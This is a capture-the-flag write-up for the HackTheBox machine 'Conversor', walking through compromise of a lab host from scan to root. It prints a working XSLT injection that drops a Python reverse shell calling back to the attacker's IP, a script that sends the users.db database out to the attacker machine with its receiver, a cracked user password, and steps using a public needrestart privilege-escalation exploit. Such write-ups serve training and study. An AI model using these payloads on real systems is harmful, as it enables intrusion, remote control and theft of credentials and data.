# Conversor-HTB Writeup
In this writeup I will share how I solved Conversor easy machin from [HackTheBox](https://app.hackthebox.com/machines/Conversor)

# User Flag
We're provided with IP 10.10.11.92 so we do our nmap scan

```bash
~/HTB/Conversor$ nmap -sS -sU 10.10.11.92

Nmap scan report for 10.10.11.92
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have the usual ports, lets go to 10.10.11.92:80 and see what we have
> Don't forget to add conversor.htb to your /etc/hosts
![login](https://github.com/AmnesiacDev/Conversor-HTB-Writeup/blob/main/login.png)

Lets register with an account and see whats inside

![dashboard](https://github.com/AmnesiacDev/Conversor-HTB-Writeup/blob/main/dashboard.png)

Okay we have an XML and XSLT uploads then they process into an HTML page, but we see something interesting in the "About" tab

![About](https://github.com/AmnesiacDev/Conversor-HTB-Writeup/blob/main/about.png)

In the source code there is1 main thing that is interesting here, in the "install md" file:

![Install](https://github.com/AmnesiacDev/Conversor-HTB-Writeup/blob/main/installmd.png)

From this we can understand that putting a python file in "scripts" directory, the **www-data** user will run it automatically

so after a bit of searching I found a useful cheat sheet for xslt PoC and many other PoCs here
>[EXSLT Extension at PayloadesAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md)


### XML
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	placeholder text
</root>
```

### XSLT
In this xslt I use the EXSLT extension in order to save our python payload to the /var/www/conversor.htb/scripts/ directory, While im sending the request I have a terminal open listening on the 4444 port

```xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/not_a_poc.py" method="text">

import socket
import subprocess

def handle_command(cmd):
    cmd = cmd.strip()
    if cmd.startswith("cd "):
        path = cmd[3:].strip()
        try:
            os.chdir(path)
            return f"Changed directory to {os.getcwd()}".encode()
        except Exception as e:
            return str(e).encode()
    result = subprocess.run(cmd, shell=True, capture_output=True)
    return result.stdout + result.stderr

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_ip = '10.10.16.12'
    attacker_port = 4444
    s.connect((attacker_ip, attacker_port))
    while True:
        command = s.recv(1024).decode('utf - 8')
        output = handle_command(command)
        s.send(output)

if __name__ == "__main__":
    reverse_shell()

    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```
### Terminal
Just like that we got our reverse shell.
```bash
~/HTB/Conversor$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.92]
```

Now I go to the instance folder which holds the users.db file which we need to get the username and password

### Conversor Machine
```bash
~/HTB/Conversor$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.92]

$ cd conversor.htb/instance

#This code send users.db to the target ip
#change TARGET_IP to your ip 
$ echo "import socket,os;\nTARGET_IP='10.10.16.12';\nPORT=1337;\nFILEPATH='instance/users.db';\nfilename=os.path.basename(FILEPATH);\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((TARGET_IP,PORT));\nprint(f'[+] Connected to {TARGET_IP}');\ns.sendall(filename.encode().ljust(1024));\nf=open(FILEPATH,'rb');\ndata=f.read(4096);\nwhile data:s.sendall(data);data=f.read(4096);\nf.close();\ns.close();\nprint('[+] File sent successfully!'\n)"  > sender.py
```

### Attacker machine
On your machine use this code and run it first with ```python3 receiver.py``` and then run the payload on the target machine 

```python

import socket

HOST = "0.0.0.0"
PORT = 1337

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print("[+] Listening on port", PORT)

    conn, addr = s.accept()
    print("[+] Connection from", addr)
    with conn:
        filename = conn.recv(1024).decode().strip()
        with open(filename, "wb") as f:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                f.write(data)
print("[+] File received successfully!")
```

```bash
~/HTB/Conversor$ python3 receiver.py
[+] Listening on port 5001...
[+] Connection from ('10.10.11.92', 33202)
[+] Receiving file: users.db
[+] File received successfully!
```
We're able to view the database now 

![user_in_db](https://github.com/AmnesiacDev/Conversor-HTB-Writeup/blob/main/user_in_db.png)

If we use an MD5 decryptor we get the password: <details>
  <summary>Click to reveal password</summary> Keepmesafeandwarm </details>

now lets login via ssh
```bash
~/HTB/Conversor$ ssh fismathack@conversor.htb
fismathack@conversor.htbs password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)
fismathack@conversor:~$ ls
user.txt
#We got our user flag
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)

fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart

fismathack@conversor:~$  /usr/sbin/needrestart -v
[main] eval /etc/needrestart/needrestart.conf
[main] needrestart v3.7
```
# Root Flag
Searching for "needrestart 3.7 exploits" I found this [CVE-2024-48990 - Needrestart 3.7-3 Privilege Escalation Exploit](https://github.com/ten-ops/CVE-2024-48990_needrestart/tree/main)

Since we don't have access to "make" on the conversor machine I first make the file on my machine
```bash
~/HTB/Conversor/CVE-2024-48990_needrestart$ make
# Send main.asm, main.o, and listener.sh to conversor machine
~/HTB/Conversor/CVE-2024-48990_needrestart$ scp src/main.asm src/listener.sh build/main.o fismathack@conversor.htb:/home/fismathack

```
### Conversor Terminal 1
```bash
fismathack@conversor:~$ mkdir -p /tmp/attacker/importlib
fismathack@conversor:~$ ld -O3 -shared -z notext -nostdlib main.o -o /tmp/attacker/importlib/__init__.so
fismathack@conversor:~$ chmod +x listener.sh
fismathack@conversor:~$ bash listener.sh
```
### Conversor Terminal 2
```bash
~/HTB/Conversor$ ssh fismathack@conversor.htb
fismathack@conversor.htbs password:

fismathack@conversor:~$ sudo -l /usr/sbin/needrestart
Scanning processes...                                                                                           
Scanning linux images...                                                                                        
Running kernel seems to be up-to-date.
No services need to be restarted.
No containers need to be restarted.
No user sessions are running outdated binaries.
No VM guests are running outdated hypervisor (qemu) binaries on this host.
```
### Back to Conversor Terminal 1
```bash
fismathack@conversor:~$ mkdir -p /tmp/attacker/importlib
fismathack@conversor:~$ ld -O3 -shared -z notext -nostdlib main.o -o /tmp/attacker/importlib/__init__.so
fismathack@conversor:~$ chmod +x listener.sh
fismathack@conversor:~$ bash listener.sh
Root obtained!, clear traces ...
$ whoami
root
$ cd /root
$ ls
root.txt 
```
## Pwned successfully
